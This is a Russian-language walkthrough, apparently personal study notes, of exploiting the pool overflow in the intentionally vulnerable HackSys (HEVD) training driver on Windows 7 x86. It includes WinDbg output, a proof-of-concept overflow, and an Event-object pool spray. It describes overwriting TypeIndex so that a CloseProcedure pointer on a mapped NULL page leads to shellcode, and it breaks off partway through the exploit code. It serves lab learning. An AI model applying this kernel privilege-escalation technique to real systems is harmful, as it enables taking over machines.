location_of_HEVD_pdb .reload .reload /f bp HEVD!TriggerPoolOverflow bp HEVD!TriggerPoolOverflow+e6 kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x8509E008 [+] UserBuffer: 0x012721B0 [+] UserBuffer Size: 0x64 [+] KernelBuffer: 0x8509E008 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow [+] Freeing Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Chunk: 0x8509E008 ****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ****** Попробуем длину ровно 0x1F8, будем на границе допустимого: kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x850C4D50 [+] UserBuffer: 0x00375668 [+] UserBuffer Size: 0x1F8 [+] KernelBuffer: 0x850C4D50 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow kd&gt; !pool 0x850C4D50 Pool page 850c4d50 region is Unknown 850c4000 size: 48 previous size: 0 (Free ) Vad 850c4048 size: 48 previous size: 48 (Free ) Vad 850c4090 size: 48 previous size: 48 (Free ) Vad 850c40d8 size: 48 previous size: 48 (Free ) Vad 850c4120 size: 48 previous size: 48 (Free ) Vad 850c4168 size: 28 previous size: 48 (Allocated) FSro 850c4190 size: b8 previous size: 28 (Allocated) File (Protected) 850c4248 size: 128 previous size: b8 (Allocated) Ntfi 850c4370 size: 98 previous size: 128 (Allocated) MmCa 850c4408 size: 168 previous size: 98 (Allocated) CcSc 850c4570 size: 68 previous size: 168 (Allocated) FMsl 850c45d8 size: c8 previous size: 68 (Allocated) Ntfx 850c46a0 size: b8 previous size: c8 (Allocated) File (Protected) 850c4758 size: 128 previous size: b8 (Allocated) Ntfi 850c4880 size: 98 previous size: 128 (Allocated) MmCa 850c4918 size: 28 previous size: 98 (Free) CcSc 850c4940 size: 140 previous size: 28 (Free ) Io Process: 86db94b8 850c4a80 size: 128 previous size: 140 (Allocated) Ntfi 850c4ba8 size: b8 previous size: 128 (Allocated) File (Protected) 850c4c60 size: c8 previous size: b8 (Allocated) Ntfx 850c4d28 size: 20 previous size: c8 (Free) Io *850c4d48 size: 200 previous size: 20 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850c4f48 size: b8 previous size: 200 (Allocated) File (Protected) kd&gt; dd 850c4d48 L90 850c4d48 04400004 6b636148 00000000 0030e810 850c4d58 41414141 41414141 41414141 41414141 850c4d68 41414141 41414141 41414141 41414141 850c4d78 41414141 41414141 41414141 41414141 850c4d88 41414141 41414141 41414141 41414141 850c4d98 41414141 41414141 41414141 41414141 850c4da8 41414141 41414141 41414141 41414141 850c4db8 41414141 41414141 41414141 41414141 850c4dc8 41414141 41414141 41414141 41414141 850c4dd8 41414141 41414141 41414141 41414141 850c4de8 41414141 41414141 41414141 41414141 850c4df8 41414141 41414141 41414141 41414141 850c4e08 41414141 41414141 41414141 41414141 850c4e18 41414141 41414141 41414141 41414141 850c4e28 41414141 41414141 41414141 41414141 850c4e38 41414141 41414141 41414141 41414141 850c4e48 41414141 41414141 41414141 41414141 850c4e58 41414141 41414141 41414141 41414141 850c4e68 41414141 41414141 41414141 41414141 850c4e78 41414141 41414141 41414141 41414141 850c4e88 41414141 41414141 41414141 41414141 850c4e98 41414141 41414141 41414141 41414141 850c4ea8 41414141 41414141 41414141 41414141 850c4eb8 41414141 41414141 41414141 41414141 850c4ec8 41414141 41414141 41414141 41414141 850c4ed8 41414141 41414141 41414141 41414141 850c4ee8 41414141 41414141 41414141 41414141 850c4ef8 41414141 41414141 41414141 41414141 850c4f08 41414141 41414141 41414141 41414141 850c4f18 41414141 41414141 41414141 41414141 850c4f28 41414141 41414141 41414141 41414141 850c4f38 41414141 41414141 41414141 41414141 850c4f48 04170040 e56c6946 00000400 000000f8 850c4f58 00000000 00000000 00000000 00000000 850c4f68 00000001 00000000 00000000 400c001c 850c4f78 82746b40 00000000 00800005 854962c0 kd&gt; dd 850c4f48 850c4f48 04170040 e56c6946 00000400 000000f8 850c4f58 00000000 00000000 00000000 00000000 850c4f68 00000001 00000000 00000000 400c001c 850c4f78 82746b40 00000000 00800005 854962c0 Видим, что влезли идеально ... const char* poc = std::string(0x1f8, &#39;A&#39;).c_str(); ... DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 0x1f8, NULL, 0, &amp;bytesRetn, NULL); ... Впереди нашего чанка хедер следующего, если мы его покорраптим, улетим в BSOD kd&gt; dd 850c4f48-8 850c4f40 41414141 41414141 04170040 e56c6946 850c4f50 00000400 000000f8 00000000 00000000 850c4f60 00000000 00000000 00000001 00000000 Поменяем длину на 0x200 и посмотрим, что будет: kd&gt; !pool 0x850C4D50 Pool page 850c4d50 region is Unknown 850c4000 size: 48 previous size: 0 (Allocated) Vad 850c4048 size: 48 previous size: 48 (Allocated) Vad 850c4090 size: 48 previous size: 48 (Allocated) Vad 850c40d8 size: 48 previous size: 48 (Allocated) Vad 850c4120 size: 48 previous size: 48 (Allocated) Vad 850c4168 size: 28 previous size: 48 (Allocated) FSro 850c4190 size: b8 previous size: 28 (Allocated) File (Protected) 850c4248 size: 128 previous size: b8 (Allocated) Ntfi 850c4370 size: 98 previous size: 128 (Allocated) MmCa 850c4408 size: 168 previous size: 98 (Allocated) CcSc 850c4570 size: 68 previous size: 168 (Allocated) FMsl 850c45d8 size: c8 previous size: 68 (Allocated) Ntfx 850c46a0 size: b8 previous size: c8 (Allocated) File (Protected) 850c4758 size: 128 previous size: b8 (Allocated) Ntfi 850c4880 size: 98 previous size: 128 (Allocated) MmCa 850c4918 size: 28 previous size: 98 (Free) CcSc 850c4940 size: 140 previous size: 28 (Free ) Io Process: 86db94b8 850c4a80 size: 128 previous size: 140 (Allocated) Ntfi 850c4ba8 size: b8 previous size: 128 (Allocated) File (Protected) 850c4c60 size: c8 previous size: b8 (Allocated) Ntfx 850c4d28 size: 20 previous size: c8 (Free) Io *850c4d48 size: 200 previous size: 20 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850c4f48 doesn&#39;t look like a valid small pool allocation, checking to see if the entire page is actually part of a large page allocation... 850c4f48 is not a valid large pool allocation, checking large session pool... 850c4f48 is not valid pool. Checking for freed (or corrupt) pool Bad previous allocation size @850c4f48, last size was 40 kd&gt; dd 850c4f48-8 ReadVirtual: 850c4f40 not properly sign extended 850c4f40 41414141 41414141 41414141 41414141 850c4f50 00000400 000000f8 00000000 00000000 850c4f60 00000000 00000000 00000001 00000000 850c4f70 00000000 400c001c 82746b40 00000000 A fatal system error has occurred. Интересная вещь, которую нужно отметить - это как мы на самом деле можем контроилровать соседний заголовок с помощью нашего переполнения. Это уязвимость, которую мы будем эксплуатировать грумингом(?) предсказуемым образом, избавлясь от рандома в нашем пуле. Для этого упомянутый ранее CreateEvent подходит идеально, так как он имее тразмер 0x40, который идеально подойдёт для размера нашего пула 0x200 Мы будем спреить большое количество объектов событий, хранить хендлы на них в массивах и смотреть, как это влияет на пул HANDLE spray_event1[10000]; HANDLE spray_event2[5000]; for (int i = 0; i &lt; 10000; i++) { spray_event1[i] = CreateEventA(0, 0, 0, 0); } for (int i = 0; i &lt; 5000; i++) { spray_event2[i] = CreateEventA(0, 0, 0, 0); } kd&gt; !pool 0x850B4620 Pool page 850b4620 region is Unknown 850b4000 size: 40 previous size: 0 (Allocated) Even (Protected) 850b4040 size: 5d8 previous size: 40 (Free) pter *850b4618 size: 200 previous size: 5d8 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) ReadVirtual: 850b4914 not properly sign extended 850b4818 size: 100 previous size: 200 (Allocated) Io Process: 86db7030 850b4918 size: a8 previous size: 100 (Allocated) MmWe ReadVirtual: 850b4afc not properly sign extended 850b49c0 size: 140 previous size: a8 (Allocated) Io Process: 86db7030 ReadVirtual: 850b4bfc not properly sign extended 850b4b00 size: 100 previous size: 140 (Free ) Io Process: 86db7030 850b4c00 size: 40 previous size: 100 (Allocated) Even (Protected) 850b4c40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4c80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4cc0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4d80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4dc0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4e80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4ec0 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f00 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f40 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4f80 size: 40 previous size: 40 (Allocated) Even (Protected) 850b4fc0 size: 40 previous size: 40 (Allocated) Even (Protected) Наши объекты событий заспреены в невыгружаемом пуле. Теперь нам нужно создать дыры и реаллокейтнуть наш уязвимый буфер Hack в созданные дыры. После реаллоцирования нашего уязвимого буфера нам нужно покорраптить хедер соседнего пула так, чтобы он вел к нашему шеллкоду. Размер объекта события будет 0x40 (0x38 + 0x8), включая заголовок пула kd&gt; !pool 0x850B4620 Pool page 850b4620 region is Unknown 850b4000 size: 40 previous size: 0 (Allocated) Even (Protected) 850b4040 size: 28 previous size: 40 (Free) pter 850b4068 size: 388 previous size: 28 (Free ) XSav 850b43f0 size: 40 previous size: 388 (Free ) Ussb Process: 86db7030 850b4430 size: 140 previous size: 40 (Allocated) Io Process: 86db7030 850b4570 size: a8 previous size: 140 (Free ) MmWe *850b4618 size: 200 previous size: a8 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 850b4818 size: 60 previous size: 200 (Free) Io 850b4878 size: 388 previous size: 60 (Free ) XSav 850b4c00 size: 40 previous size: 388 (Allocated) Even (Protected) 850b4c40 size: 40 previous size: 40 (Allocated) Even (Protected) kd&gt; dt _POOL_HEADER 850b4618 nt!_POOL_HEADER +0x000 PreviousSize : 0y000010101 (0x15) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y001000000 (0x40) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4400015 +0x004 PoolTag : 0x6b636148 +0x004 AllocatorBackTraceIndex : 0x6148 +0x006 PoolTagHash : 0x6b63 Разберём хедеры: kd&gt; g [+] Allocating Pool chunk [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: NonPagedPool [+] Pool Size: 0x1F8 [+] Pool Chunk: 0x8524D4C8 [+] UserBuffer: 0x00098908 [+] UserBuffer Size: 0x1F8 [+] KernelBuffer: 0x8524D4C8 [+] KernelBuffer Size: 0x1F8 [+] Triggering Pool Overflow Break instruction exception - code 80000003 (first chance) HEVD!TriggerPoolOverflow+0xd8: a855a202 ff750c push dword ptr [ebp+0Ch] kd&gt; !pool 0x8524D4C8 Pool page 8524d4c8 region is Unknown 8524d000 size: 40 previous size: 0 (Allocated) Even (Protected) 8524d040 size: f8 previous size: 40 (Free) r... 8524d138 size: 388 previous size: f8 (Free ) XSav *8524d4c0 size: 200 previous size: 388 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) ReadVirtual: 8524d7fc not properly sign extended 8524d6c0 size: 140 previous size: 200 (Allocated) Io Process: 86d7e228 8524d800 size: 40 previous size: 140 (Allocated) Even (Protected) 8524d840 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d880 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d8c0 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d900 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d940 size: 40 previous size: 40 (Allocated) Even (Protected) 8524d980 size: 40 previous size: 40 (Allocated) Even (Protected) kd&gt; dd 8524d6c0-8 ReadVirtual: 8524d6b8 not properly sign extended 8524d6b8 41414141 41414141 14280040 20206f49 8524d6c8 00320033 0063005c 00720065 00700074 8524d6d8 006f0072 002e0070 006c0064 0000006c 8524d6e8 c0100002 0424007e 95d23b8f 00000000 8524d6f8 1c210007 20206f49 00000000 00630069 8524d708 005c0065 00610048 00640072 00690064 8524d718 006b0073 006f0056 0075006c 0065006d 8524d728 005c0031 00690057 0064006e 0077006f Так как мы спреим невыгружаемый пул с помощью объектов событий, мы можем просто добавить наши значения в конец нашего уязвимого буфера. Но это не сработает, так как хедеры имеют внутреннюю структуру, нужна некоторая модификация. Давайте копнём глубже в хедеры, чтобы понять, что модифицировать: Вещь, которая нас интересует, это TypeIndex, который на самом деле оффсет (0xC) в массиве указателей, который объявляет OBJECT_TYPE каждого объекта, который поддерживает Windows. kd&gt; dd nt!ObTypeIndexTable 8277aee0 00000000 bad0b0b0 84ec7860 84ec7798 8277aef0 84ec76d0 84ec74a0 84ec7360 84ec7298 8277af00 84ec71d0 84ecef78 84eceeb0 84ece818 84ec71d0 - оффсет 0xC 8277af10 84f60418 84f60350 84f61418 84f61350 8277af20 84f5f3f0 84f5f328 84f629b8 84f628f0 8277af30 84f62828 84f62760 84f62698 84f625d0 8277af40 84f62508 84f62440 84f62378 84f63040 8277af50 84f63f78 84f63bd8 84f63b10 84f63a48 kd&gt; dt nt!_OBJECT_TYPE 84f60418 . +0x000 TypeList : [ 0x84f60418 - 0x84f60418 ] +0x000 Flink : 0x84f60418 _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x004 Blink : 0x84f60418 _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x008 Name : &quot;Event&quot; +0x000 Length : 0xa +0x002 MaximumLength : 0xc +0x004 Buffer : 0x8cc08a88 &quot;Event&quot; +0x010 DefaultObject : +0x014 Index : 0xc &#39;&#39; +0x018 TotalNumberOfObjects : 0x4643 +0x01c TotalNumberOfHandles : 0x466f +0x020 HighWaterNumberOfObjects : 0x4643 +0x024 HighWaterNumberOfHandles : 0x466f +0x028 TypeInfo : +0x000 Length : 0x50 +0x002 ObjectTypeFlags : 0 &#39;&#39; +0x002 CaseInsensitive : 0y0 +0x002 UnnamedObjectsOnly : 0y0 +0x002 UseDefaultObject : 0y0 +0x002 SecurityRequired : 0y0 +0x002 MaintainHandleCount : 0y0 +0x002 MaintainTypeList : 0y0 +0x002 SupportsObjectCallbacks : 0y0 +0x002 CacheAligned : 0y0 +0x004 ObjectTypeCode : 2 +0x008 InvalidAttributes : 0x100 +0x00c GenericMapping : _GENERIC_MAPPING +0x01c ValidAccessMask : 0x1f0003 +0x020 RetainAccess : 0 +0x024 PoolType : 0 ( NonPagedPool ) +0x028 DefaultPagedPoolCharge : 0 +0x02c DefaultNonPagedPoolCharge : 0x40 +0x030 DumpProcedure : (null) +0x034 OpenProcedure : (null) +0x038 CloseProcedure : (null) Важные моменты: Первый указатель 00000000 очень важен, так как мы на Windows 7 (объяснение дальше) Следующий выделенный указатель 84f60418, который по оффсету 0xC от начала Анализируя, мы понимаем, что это объект типа Event Теперь самое интеерсное: член TypeInfo по оффсету 0x28 В конце этого члена есть вызовы нескольких процедур, можем использовать удобную из предоставленных. Будем импользовать CloseProcedure, находящуюся по 0x38 Оффсет на CloseProcedure становится 0x28 + 0x38 = 0x60 0x60 - это указатель, который мы будем переписывать указателем на шеллкод и затем вызывать метод CloseProcedure Наша цель - изменить оффсет TypeIndex с 0xc на 0x0, поскольку первый указатель является нулевым, а в Windows 7 существует недостаток, при котором возможно отображение NULL-страниц с помощью вызова NtAllocateVirtualMemory NTSTATUS ZwAllocateVirtualMemory( _In_ HANDLE ProcessHandle, _Inout_ PVOID *BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect ); И затем пишем указатель на наш шеллкод в нужную локацию (0x60), используя вызов WriteProcessMemory BOOL WINAPI WriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_ LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_ SIZE_T *lpNumberOfBytesWritten ); Ещё одно объяснение из следующей статьи (дальше делал по коду из второго мануала, TODO: переделать, убрать векторы) Общая идея атаки Что у нас есть сейчас? - возможность перезаписать память пула. Чтобы получить из этого выгоду, нам нужно найти способ поменять состояние пула на предсказуемое нами. Если мы повредим поля, мы улетим в БСОД. В целом, невыгружаемый пул фрагментирован, что значит, что в нём есть дыры из чанков, которые были освобождены другими процессами системы. Нам нужно заполнить эти дыры спрея кучу объектов в невыгружаемый пул так, что механизм аллокации положит наши чанки в эти пустые слоты. Как только это получится, нам нужно ещё заспреить объектов, чтобы самые частые(?) объекты в пуле были нашими. Приводя аналогию, В качестве аналогии, если бы у нас был мешок с фигурами из шахматного набора, у нас было бы мало шансов вытащить из него короля; однако, если мы добавим в мешок 15 000 королей, наши шансы значительно возрастут! И так, две цели: заспреить пул объектами, пока органически существующие в пуле дыри не заполнятся нашими объектами заспреить пул снова, чтобы увеличить количество объектов, которые мы аллоцировали, чтобы они были последовательными в невыгружаемом пуле Далее взять наши аллокации, которые образовали большой цельный блок, и проделаем в них дырки размеров с наш ядерный буфер, который мы можем аллоцировать с помощью функций драйвера. Наш ядерный буфер размером 0x200. Таким образом, когда наш буфер аллоцирован, аллокатор положит его по освобождённой 0x200 дыре, которую мы только что создали. Теперь наша аллокация(буфер) полностью окружена объектами, которые мы сами заспреили. Это прекрасно, потому что теперь, когда наш буфер переполняет соседней аллокации пула, мы будем знать, что конкретно мы перезаписываем, потому что это будет чанк, который мы сами и аллоцировали Мы будем использовать эту возможность перезаписи данных, чтобы предсказуемо перезаписать часть данных в одном из наших аллоцированных объектов, который, после освобождения, закончится тем, что ядро выполнит указатель функции, который мы заполним шеллкодом. Теперь план такой: спреим пул объектами, пока все органические дырки не будут заполнены нашими объектами спреим пул снова… делаем 0x200 дыры в аллокациях используем функции драйвера, чтобы заполнить нашим ядерным буфером новые дыры чтобы это распределение предсказуемо перезаписало информацию в соседней аллокации, что приведет к выполнению ядром нашего шеллкода, когда поврежденная аллокация будет освобождена Event objects Автор блога информирует нас, что Event Object идеальны для этой задачи, потому что их размер 0x40. Мы можем освободить 8 Event Objects и получить наши дырки размером 0x200 байт. &gt;&gt;&gt; 0x200 % 0x40 0 &gt;&gt;&gt; 0x200 / 0x40 8.0 На параметры нам всё равно, так что будем вызывать CreateEventA с нулями Что мы видим? Что наш чанк hack посередине аллоцированных CreateEvent’ом: kd&gt; !pool 0x8513C8C8 Pool page 8513c8c8 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even И там у нас: kd&gt; dd 8513c8c0 L30 8513c8c0 04400008 6b636148 41414141 41414141 8513c8d0 41414141 41414141 41414141 41414141 8513c8e0 41414141 41414141 41414141 41414141 8513c8f0 41414141 41414141 41414141 41414141 8513c900 41414141 41414141 41414141 41414141 8513c910 41414141 41414141 41414141 41414141 8513c920 41414141 41414141 41414141 41414141 8513c930 41414141 41414141 41414141 41414141 8513c940 41414141 41414141 41414141 41414141 8513c950 41414141 41414141 41414141 41414141 8513c960 41414141 41414141 41414141 41414141 8513c970 41414141 41414141 41414141 41414141 Кстати, указатель на этот ядерный пул содержится в eax (вместо принта в самом драйвере можно было получить адрес ещё из eax) Этот адрес - на 8 байт дальше самой аллокации, потому что 4-х байтовый лонг и тег кладутся до непосредственного буфера. kd&gt; !pool 8513c8c0 Pool page 8513c8c0 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even kd&gt; dt nt!_POOL_HEADER 8513c8c0 +0x000 PreviousSize : 0y000001000 (0x8) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y001000000 (0x40) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4400008 +0x004 PoolTag : 0x6b636148 +0x004 AllocatorBackTraceIndex : 0x6148 +0x006 PoolTagHash : 0x6b63 kd&gt; db 8513c8c0+4 8513c8c4 48 61 63 6b 41 41 41 41-41 41 41 41 41 41 41 41 HackAAAAAAAAAAAA kd&gt; dt nt!_POOL_HEADER 8513cdc0 +0x000 PreviousSize : 0y000001000 (0x8) +0x000 PoolIndex : 0y0000000 (0) +0x002 BlockSize : 0y000001000 (0x8) +0x002 PoolType : 0y0000010 (0x2) +0x000 Ulong1 : 0x4080008 +0x004 PoolTag : 0xee657645 +0x004 AllocatorBackTraceIndex : 0x7645 +0x006 PoolTagHash : 0xee65 kd&gt; dt nt!_OBJECT_HEADER_QUOTA_INFO 8513cdc0+8 +0x000 PagedPoolCharge : 0 +0x004 NonPagedPoolCharge : 0x40 +0x008 SecurityDescriptorCharge : 0 +0x00c SecurityDescriptorQuotaBlock : (null) kd&gt; dt nt!_OBJECT_HEADER 8513cdc0+8+10 +0x000 PointerCount : 0n1 +0x004 HandleCount : 0n1 +0x004 NextToFree : 0x00000001 Void +0x008 Lock : _EX_PUSH_LOCK +0x00c TypeIndex : 0xc &#39;&#39; +0x00d TraceFlags : 0 &#39;&#39; +0x00e InfoMask : 0x8 &#39;&#39; +0x00f Flags : 0 &#39;&#39; +0x010 ObjectCreateInfo : 0x86e7f640 _OBJECT_CREATE_INFORMATION +0x010 QuotaBlockCharged : 0x86e7f640 Void +0x014 SecurityDescriptor : (null) +0x018 Body : _QUAD kd&gt; dd nt!ObTypeIndexTable 82761ee0 00000000 bad0b0b0 84ec7860 84ec7798 82761ef0 84ec76d0 84ec74a0 84ec7360 84ec7298 82761f00 84ec71d0 84ecef78 84eceeb0 84ece818 82761f10 84f60418 84f60350 84f61418 84f61350 82761f20 84f5f3f0 84f5f328 84f629b8 84f628f0 82761f30 84f62828 84f62760 84f62698 84f625d0 82761f40 84f62508 84f62440 84f62378 84f63040 82761f50 84f63f78 84f63bd8 84f63b10 84f63a48 kd&gt; dd nt!ObTypeIndexTable+0xC*4 L1 82761f10 84f60418 kd&gt; dt nt!_OBJECT_TYPE 84f60418 -b +0x000 TypeList : _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x000 Flink : 0x84f60418 +0x004 Blink : 0x84f60418 +0x008 Name : _UNICODE_STRING &quot;Event&quot; +0x000 Length : 0xa +0x002 MaximumLength : 0xc +0x004 Buffer : 0x8cc08a88 &quot;Event&quot; +0x010 DefaultObject : (null) +0x014 Index : 0xc &#39;&#39; +0x018 TotalNumberOfObjects : 0x5043 +0x01c TotalNumberOfHandles : 0x506e +0x020 HighWaterNumberOfObjects : 0x5e7b +0x024 HighWaterNumberOfHandles : 0x5ea6 +0x028 TypeInfo : _OBJECT_TYPE_INITIALIZER +0x000 Length : 0x50 +0x002 ObjectTypeFlags : 0 &#39;&#39; +0x002 CaseInsensitive : 0y0 +0x002 UnnamedObjectsOnly : 0y0 +0x002 UseDefaultObject : 0y0 +0x002 SecurityRequired : 0y0 +0x002 MaintainHandleCount : 0y0 +0x002 MaintainTypeList : 0y0 +0x002 SupportsObjectCallbacks : 0y0 +0x002 CacheAligned : 0y0 +0x004 ObjectTypeCode : 2 +0x008 InvalidAttributes : 0x100 +0x00c GenericMapping : _GENERIC_MAPPING +0x000 GenericRead : 0x20001 +0x004 GenericWrite : 0x20002 +0x008 GenericExecute : 0x120000 +0x00c GenericAll : 0x1f0003 +0x01c ValidAccessMask : 0x1f0003 +0x020 RetainAccess : 0 +0x024 PoolType : 0 ( NonPagedPool ) +0x028 DefaultPagedPoolCharge : 0 +0x02c DefaultNonPagedPoolCharge : 0x40 +0x030 DumpProcedure : (null) +0x034 OpenProcedure : (null) +0x038 CloseProcedure : (null) +0x03c DeleteProcedure : (null) +0x040 ParseProcedure : (null) +0x044 SecurityProcedure : 0x8288532c +0x048 QueryNameProcedure : (null) +0x04c OkayToCloseProcedure : (null) +0x078 TypeLock : _EX_PUSH_LOCK +0x000 Locked : 0y0 +0x000 Waiting : 0y0 +0x000 Waking : 0y0 +0x000 MultipleShared : 0y0 +0x000 Shared : 0y0000000000000000000000000000 (0) +0x000 Value : 0 +0x000 Ptr : (null) +0x07c Key : 0x6e657645 +0x080 CallbackList : _LIST_ENTRY [ 0x84f60498 - 0x84f60498 ] +0x000 Flink : 0x84f60498 +0x004 Blink : 0x84f60498 По оффсет 0x28 находится структура TypeInfo. Один из её членов ClosePorcedure по оффсету 0x38. Начиная с оффсета 0x0, на который ссылается указатель OBJECT_TYPE, который мы нашли в таблице, CloseProcedure находится по 0x28 + 0x38 = 0x60. ЭТО указатель на функцию, которая будет вызвана при вызове CloseHandle, чтобы освободить Event Objects из невыгружаемого пула памяти. Это наша цель Когда мы особождаем чанк с помощью CloseHandle, ядро идёт по адресу, на который ссылается значение массива по индексу 0xC и ищет по оффсету 0x60 указатель на функцию, вызывая её. kd&gt; dd nt!ObTypeIndexTable 82761ee0 00000000 bad0b0b0 84ec7860 84ec7798 Первый указатель - это 0x0 и мы из ещё не сделанный урок знаем, что мы можем мапить NULL страницу в Windows 7 x86. Итак, благодаря вышеупомянутым блогерам, наш дальнейший путь ясен. Мы корраптим только значение 0xC внутри OBJECT_HEADER, чтобы вместо него было установлено 0x0. Все остальное мы оставим как есть с помощью перезаписи. Таким образом, когда мы освободим этот кусок, ядро начнет искать смещение 0x60 для указателя функции с 0x000000. Поэтому мы просто отобразим страницу NULL и поместим указатель на наш шеллкод по смещению 0x60. Выполняем план Делаем дыры в блоке, чтобы наш буфер расположился там между Event Objects. Мы знаем, что для 0x200 дырки наш нужно освободить 8 объектов, следуя @FuzzySec будем освобождать 8 хендлов Event Objects каждые 0x16 хендлов в нашем векторе. #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;Windows.h&gt; using namespace std; #define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22200F vector&lt;HANDLE&gt; defragment_handles; vector&lt;HANDLE&gt; sequential_handles; int main() { HANDLE hFile = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] No handle to HackSysExtremeVulnerableDriver\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] Grabbed handle to HackSysExtremeVulnerableDriver: &quot; &lt;&lt; hex &lt;&lt; hFile &lt;&lt; &quot;\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying pool to defragment...\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during defragmentation\n&quot;; exit(1); } defragment_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Defragmentation spray complete.\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying sequential allocations...\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if 